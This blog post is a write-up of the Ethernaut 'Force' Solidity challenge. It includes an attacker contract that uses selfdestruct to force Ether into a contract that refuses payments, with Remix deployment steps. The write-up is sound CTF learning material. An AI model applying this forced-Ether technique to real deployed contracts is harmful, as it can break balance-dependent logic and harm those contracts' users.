---
layout: post
title: Ethernaut - 7. Force
date:  2022-08-28
tags: ethernaut solidity
---

## Difficulty: 🌕🌕🌕🌑🌑
> Some contracts will simply not take your money ¯\_(ツ)_/¯ <br /><br />
  The goal of this level is to make the balance of the contract greater than zero.<br /><br />
  Things that might help:<br />
  - Fallback methods 
  - Sometimes the best way to attack a contract is with another contract.
  - See the Help page above, section "Beyond the console"

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## Writeup
The keypoint to complete this level is `selfdestruct`. After calling `selfdestruct` method, contract will send all remaining Ether to a designated address. A malicious contract can use selfdestruct to force sending Ether to any contract.

1. Get new Instance.
2. Create a contract
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity 0.8.16;

    contract Force {/*

                      MEOW ?
            /\_/\   /
        ____/ o o \
      /~____  =ø= /
    (______)__m_m)

    */}

    contract ForceAttacker {
        Force force;

        // For a contract to be able to receive ether, the constructor function must be marked payable.
        constructor(Force _force) payable { 
            force = Force(_force);
        }

        function getBalance() public view returns (uint256) {
          return address(this).balance;
        }

        function attack() public {
            address payable addr = payable(address(force));
            selfdestruct(addr);
        }
    }
    ```
3. Compile & Deploy 
    <img src="https://i.imgur.com/K7kJZee.png" alt="remix" style="width:400px;"/>
4. Click **getBalnce** button, it will return 1wei.
    <img src="https://i.imgur.com/4AevuKw.png" alt="remix" style="width:300px;"/>
5. Click **attack** button. The contract will self-destruct, and the remaining 1wei will be send to Force contract.
6. Submit instance ξ( ✿＞◡❛)

## Reference
[Solidity by example - Self Destruct](https://solidity-by-example.org/hacks/self-destruct/)
